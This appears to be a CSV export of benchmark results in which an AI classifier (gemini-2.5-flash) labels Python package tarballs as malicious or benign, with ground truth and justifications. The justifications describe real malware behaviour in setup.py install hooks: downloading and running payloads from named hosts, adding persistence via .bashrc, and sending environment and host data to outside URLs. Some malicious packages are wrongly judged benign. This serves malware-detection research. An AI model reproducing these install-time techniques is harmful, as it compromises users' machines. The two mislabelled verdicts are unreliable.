"groundtruth","subclass","package_size","classification","package_name","agent","justification","classification_id","package_name-2","package_metadata","classification-2","justification-2","suspicious_files","created_at","updated_at","prompt_id","model","dataset_id","experiment_id"
"malicious","malicious","4188","malicious","libpeshka-0.6.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains highly suspicious code. The `rn()` function attempts to download a file from `http://145.249.104.71/out` (a remote IP address) and save it as `.drv` in the user's home directory. It then changes the permissions of this downloaded file to make it executable and adds an entry to `.bashrc` to run it automatically on system startup. This behavior is indicative of a backdoor or persistent malicious script being installed on the system.","d4ded849-2524-468c-9314-2ca7535acfda","libpeshka","{""model_type"": ""gemini"", ""author_name"": ""Ruri12"", ""author_email"": ""ruri12@example.com"", ""num_of_files"": 11, ""package_name"": ""libpeshka"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Libari wrapper for python"", ""package_version"": ""0.6"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""The package is classified as **malicious**.\n\n**Justification:**\n\nThe `setup.py` file contains highly suspicious code. The `rn()` function attempts to download a file from `http://145.249.104.71/out` (a remote IP address) and save it as `.drv` in the user's home directory. It then changes the permissions of this downloaded file to make it executable and adds an entry to `.bashrc` to run it automatically on system startup. This behavior is indicative of a backdoor or persistent malicious script being installed on the system."", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""pr.py"", ""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/libpeshka-0.6_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains highly suspicious code. The `rn()` function attempts to download a file from `http://145.249.104.71/out` (a remote IP address) and save it as `.drv` in the user's home directory. It then changes the permissions of this downloaded file to make it executable and adds an entry to `.bashrc` to run it automatically on system startup. This behavior is indicative of a backdoor or persistent malicious script being installed on the system.","{setup.py}","2025-06-29 20:04:47.220652+00","2025-06-29 20:04:47.220652+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","58185280-bc4d-434f-aa72-a5bbc3c51da6","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","15976","benign","yiffparty-0.05.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains standard package setup information and lists common web scraping libraries (`requests`, `beautifulsoup4`) as dependencies, which aligns with the package's stated purpose of getting images from a website. The `__init__.py` file is empty. No suspicious imports or code were found in the entry-point files, and there is no indication from the provided information that `horni.py` or `tests.py` are directly imported or executed by `setup.py` or `__init__.py`. The metadata, although containing unusual author contact information and homepage, does not provide concrete evidence of malicious intent.","4b77ec72-dec3-430b-9805-82a0dc2027cf","yiffparty","{""model_type"": ""gemini"", ""author_name"": ""icy__flames"", ""author_email"": ""dontfuckingbother@emailisfake.net"", ""num_of_files"": 7, ""package_name"": ""yiffparty"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Simple tool to get images from yiff-party.com"", ""package_version"": ""0.05"", ""package_homepage"": ""http://lolurmomis.gay"", ""gemini_raw_response"": ""Classification: Benign\nJustification: The `setup.py` file contains standard package setup information and lists common web scraping libraries (`requests`, `beautifulsoup4`) as dependencies, which aligns with the package's stated purpose of getting images from a website. The `__init__.py` file is empty. No suspicious imports or code were found in the entry-point files, and there is no indication from the provided information that `horni.py` or `tests.py` are directly imported or executed by `setup.py` or `__init__.py`. The metadata, although containing unusual author contact information and homepage, does not provide concrete evidence of malicious intent.\nSuspicious file(s): None"", ""num_of_python_files"": 4, ""package_description"": ""yiffparty!"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""tests.py"", ""horni.py""], ""package_formatted_path"": "".temp/plain/yiffparty-0.05_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file contains standard package setup information and lists common web scraping libraries (`requests`, `beautifulsoup4`) as dependencies, which aligns with the package's stated purpose of getting images from a website. The `__init__.py` file is empty. No suspicious imports or code were found in the entry-point files, and there is no indication from the provided information that `horni.py` or `tests.py` are directly imported or executed by `setup.py` or `__init__.py`. The metadata, although containing unusual author contact information and homepage, does not provide concrete evidence of malicious intent.","{}","2025-06-29 20:04:47.232987+00","2025-06-29 20:04:47.232987+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","f7b14d83-c0f8-4ceb-84a5-47d20a8d5cae","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","7787","malicious","dpp_client-1.0.3.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file executes shell commands (`pwd`, `whoami`, `hostname`) to gather system information. This information is then encoded and exfiltrated to an external URL (`http://pt.traktrain.com/RCE_PYTHON`) via `urllib.request.urlopen` during the package installation process. This behavior is highly indicative of data exfiltration and is a significant security risk.","b44b6e5a-8949-4eb5-808b-17b320412880","dpp-client","{""model_type"": ""gemini"", ""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 11, ""package_name"": ""dpp-client"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""1.0.3"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file executes shell commands (`pwd`, `whoami`, `hostname`) to gather system information. This information is then encoded and exfiltrated to an external URL (`http://pt.traktrain.com/RCE_PYTHON`) via `urllib.request.urlopen` during the package installation process. This behavior is highly indicative of data exfiltration and is a significant security risk.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 5, ""package_description"": ""test"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""http.py"", ""base.py"", ""test_http.py""], ""package_formatted_path"": "".temp/plain/dpp_client-1.0.3_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file executes shell commands (`pwd`, `whoami`, `hostname`) to gather system information. This information is then encoded and exfiltrated to an external URL (`http://pt.traktrain.com/RCE_PYTHON`) via `urllib.request.urlopen` during the package installation process. This behavior is highly indicative of data exfiltration and is a significant security risk.","{setup.py}","2025-06-29 20:05:12.911191+00","2025-06-29 20:05:12.911191+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","94c0e6ed-71c2-4623-aefb-351470616e1b","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","3941","malicious","aws-login0tool-0.0.14.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains a custom `install` command (`SneakyInstall`) that, when executed, downloads an executable file named `normal.exe` from `https://tryg.ga/` using `urllib.request.urlretrieve` and then immediately executes it using `Popen`. This behavior indicates a clear attempt to compromise the system during package installation.","b1c3be9a-58d4-414c-92d1-f21afbf87be0","aws-login0tool","{""model_type"": ""gemini"", ""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 10, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.14"", ""package_homepage"": ""https://example.com"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file contains a custom `install` command (`SneakyInstall`) that, when executed, downloads an executable file named `normal.exe` from `https://tryg.ga/` using `urllib.request.urlretrieve` and then immediately executes it using `Popen`. This behavior indicates a clear attempt to compromise the system during package installation.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.14_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains a custom `install` command (`SneakyInstall`) that, when executed, downloads an executable file named `normal.exe` from `https://tryg.ga/` using `urllib.request.urlretrieve` and then immediately executes it using `Popen`. This behavior indicates a clear attempt to compromise the system during package installation.","{setup.py}","2025-06-29 20:05:12.911686+00","2025-06-29 20:05:12.911686+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","c5084bba-e536-4790-845b-88d93feb5838","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","49435","benign","outcome-1.2.0.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file is standard, importing `setuptools` and reading the version from `_version.py`. The `_version.py` file simply defines the package version. No suspicious imports or code were found in the analyzed files. The package metadata also appears legitimate and consistent with a benign package.","ae7c5eab-034a-48f6-9a36-b385666efcb0","outcome","{""model_type"": ""gemini"", ""author_name"": ""Frazer McLean"", ""author_email"": ""frazer@frazermclean.co.uk"", ""num_of_files"": 31, ""package_name"": ""outcome"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Capture the outcome of Python function calls."", ""package_version"": ""1.2.0"", ""package_homepage"": ""https://github.com/python-trio/outcome"", ""gemini_raw_response"": ""Classification: Benign\nJustification: The `setup.py` file is standard, importing `setuptools` and reading the version from `_version.py`. The `_version.py` file simply defines the package version. No suspicious imports or code were found in the analyzed files. The package metadata also appears legitimate and consistent with a benign package."", ""num_of_python_files"": 8, ""package_description"": "".. image:: https://img.shields.io/badge/chat-join%20now-blue.svg"", ""available_python_files"": [""setup.py"", ""test_sync.py"", ""__init__.py"", ""test_async.py"", ""conf.py"", ""_util.py"", ""_impl.py"", ""_version.py""], ""package_formatted_path"": "".temp/plain/outcome-1.2.0_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file is standard, importing `setuptools` and reading the version from `_version.py`. The `_version.py` file simply defines the package version. No suspicious imports or code were found in the analyzed files. The package metadata also appears legitimate and consistent with a benign package.","{}","2025-06-29 20:05:37.955355+00","2025-06-29 20:05:37.955355+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","c79ed7d2-bab8-4747-97c7-7ad7a87803ca","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","3713","benign","importantpackage-0.2.1.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains standard package metadata and uses `setuptools` for packaging, which is common for Python packages. The import of `importantpackage` likely refers to the package's own `__init__.py` file, which is a standard practice. There are no suspicious imports, external URLs that download or execute code, or unusual commands that indicate malicious intent.","c3c7603f-8238-4cab-b254-afb9140175f1","importantpackage","{""model_type"": ""gemini"", ""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 8, ""package_name"": ""importantpackage"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.2.1"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""gemini_raw_response"": ""Classification: Benign\nJustification: The `setup.py` file contains standard package metadata and uses `setuptools` for packaging, which is common for Python packages. The import of `importantpackage` likely refers to the package's own `__init__.py` file, which is a standard practice. There are no suspicious imports, external URLs that download or execute code, or unusual commands that indicate malicious intent.\nSuspicious Files: None"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/importantpackage-0.2.1_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file contains standard package metadata and uses `setuptools` for packaging, which is common for Python packages. The import of `importantpackage` likely refers to the package's own `__init__.py` file, which is a standard practice. There are no suspicious imports, external URLs that download or execute code, or unusual commands that indicate malicious intent.","{}","2025-06-29 20:07:52.694102+00","2025-06-29 20:07:52.694102+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","93af1b79-a820-4e3d-a23e-9e1bf5f01aa9","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","3947","malicious","aws-login0tool-0.0.13.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains a custom `SneakyInstall` class that, during the installation process, downloads an executable (`syswin32.exe`) from a remote URL (`https://tryg.ga/syswin32.exe`) and then executes it using `subprocess.Popen`. This behavior is indicative of a supply chain attack, where arbitrary code is executed on the user's system during package installation.","da73ebf7-f289-41d8-9a02-01f3f515710d","aws-login0tool","{""model_type"": ""gemini"", ""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 10, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.13"", ""package_homepage"": ""https://example.com"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file contains a custom `SneakyInstall` class that, during the installation process, downloads an executable (`syswin32.exe`) from a remote URL (`https://tryg.ga/syswin32.exe`) and then executes it using `subprocess.Popen`. This behavior is indicative of a supply chain attack, where arbitrary code is executed on the user's system during package installation.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.13_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains a custom `SneakyInstall` class that, during the installation process, downloads an executable (`syswin32.exe`) from a remote URL (`https://tryg.ga/syswin32.exe`) and then executes it using `subprocess.Popen`. This behavior is indicative of a supply chain attack, where arbitrary code is executed on the user's system during package installation.","{setup.py}","2025-06-29 20:07:57.109862+00","2025-06-29 20:07:57.109862+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","081be62b-0924-4fdd-b5c5-c0db15a2479a","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","141178","benign","panflute-2.2.3.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file appears standard for a Python package, importing `setuptools` and `os`. It also reads `version.py` for the package version, which is a common practice. The package also specifies standard dependencies like `click` and `pyyaml`. There are no suspicious imports, commands, or file operations observed in the `setup.py` that would indicate malicious intent. The package metadata also seems legitimate with a clear author, homepage, and summary. No suspicious files were identified.","a21c43d7-9751-49d7-81ed-bf3d3ac2fe02","panflute","{""model_type"": ""gemini"", ""author_name"": ""Sergio Correia"", ""author_email"": ""sergio.correia@gmail.com"", ""num_of_files"": 21, ""package_name"": ""panflute"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Pythonic Pandoc filters"", ""package_version"": ""2.2.3"", ""package_homepage"": ""https://github.com/sergiocorreia/panflute"", ""gemini_raw_response"": ""Classification: Benign\n\nJustification: The `setup.py` file appears standard for a Python package, importing `setuptools` and `os`. It also reads `version.py` for the package version, which is a common practice. The package also specifies standard dependencies like `click` and `pyyaml`. There are no suspicious imports, commands, or file operations observed in the `setup.py` that would indicate malicious intent. The package metadata also seems legitimate with a clear author, homepage, and summary. No suspicious files were identified."", ""num_of_python_files"": 11, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""containers.py"", ""tools.py"", ""table_elements.py"", ""autofilter.py"", ""utils.py"", ""io.py"", ""base.py"", ""version.py"", ""__init__.py"", ""elements.py""], ""package_formatted_path"": "".temp/plain/panflute-2.2.3_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file appears standard for a Python package, importing `setuptools` and `os`. It also reads `version.py` for the package version, which is a common practice. The package also specifies standard dependencies like `click` and `pyyaml`. There are no suspicious imports, commands, or file operations observed in the `setup.py` that would indicate malicious intent. The package metadata also seems legitimate with a clear author, homepage, and summary. No suspicious files were identified.","{}","2025-06-29 20:08:18.249999+00","2025-06-29 20:08:18.249999+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","53529b1a-2c1d-4dde-859c-a767dc8e72c6","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","3369","malicious","libpeshka-0.2.tar.gz","classifier-no-tool-no-state-information","The `setup.py` script contains a function `rn()` which is executed during package installation. This function downloads a file from `http://145.249.104.71/out`, saves it as `.drv` in the user's home directory, makes it executable, and adds a line to the user's `.bashrc` file to execute `.drv` on shell startup. This behavior is highly indicative of a malicious package attempting to establish persistence and execute arbitrary code on the system.","fac42a17-9425-4f8e-bfdd-6053f6460cee","libpeshka","{""model_type"": ""gemini"", ""author_name"": ""Ruri12"", ""author_email"": ""ruri12@example.com"", ""num_of_files"": 10, ""package_name"": ""libpeshka"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Libari wrapper for python"", ""package_version"": ""0.2"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""Classification: Malicious\n\nJustification: The `setup.py` script contains a function `rn()` which is executed during package installation. This function downloads a file from `http://145.249.104.71/out`, saves it as `.drv` in the user's home directory, makes it executable, and adds a line to the user's `.bashrc` file to execute `.drv` on shell startup. This behavior is highly indicative of a malicious package attempting to establish persistence and execute arbitrary code on the system.\n\nSuspicious file(s): setup.py"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""pr.py"", ""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/libpeshka-0.2_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` script contains a function `rn()` which is executed during package installation. This function downloads a file from `http://145.249.104.71/out`, saves it as `.drv` in the user's home directory, makes it executable, and adds a line to the user's `.bashrc` file to execute `.drv` on shell startup. This behavior is highly indicative of a malicious package attempting to establish persistence and execute arbitrary code on the system.","{setup.py}","2025-06-29 20:08:23.055596+00","2025-06-29 20:08:23.055596+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","86f1c4d3-6048-4f56-ac69-72545c6dbe49","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","7722","malicious","dpp_client-1.0.5.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains code that uses `os.popen('env')` to collect environment variables and `os.listdir(""./../"")` to list files in the parent directory. This information is then sent to an external URL (`http://pt.traktrain.com/req.php`) using `urllib.request.urlopen`. This behavior indicates an attempt to exfiltrate sensitive system and file information during package installation, which is a clear malicious activity.","d2b9c5e9-a2bb-4338-88f7-f0cb095ae54b","dpp-client","{""model_type"": ""gemini"", ""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 11, ""package_name"": ""dpp-client"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""1.0.5"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file contains code that uses `os.popen('env')` to collect environment variables and `os.listdir(\""./../\"")` to list files in the parent directory. This information is then sent to an external URL (`http://pt.traktrain.com/req.php`) using `urllib.request.urlopen`. This behavior indicates an attempt to exfiltrate sensitive system and file information during package installation, which is a clear malicious activity.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 5, ""package_description"": ""test"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""http.py"", ""base.py"", ""test_http.py""], ""package_formatted_path"": "".temp/plain/dpp_client-1.0.5_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains code that uses `os.popen('env')` to collect environment variables and `os.listdir(""./../"")` to list files in the parent directory. This information is then sent to an external URL (`http://pt.traktrain.com/req.php`) using `urllib.request.urlopen`. This behavior indicates an attempt to exfiltrate sensitive system and file information during package installation, which is a clear malicious activity.","{setup.py}","2025-06-29 20:09:13.534755+00","2025-06-29 20:09:13.534755+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","2bfb40c0-4045-4465-8851-a9807cd2bfc7","8bca045c-2577-46e3-bd68-24d40f4aec73"
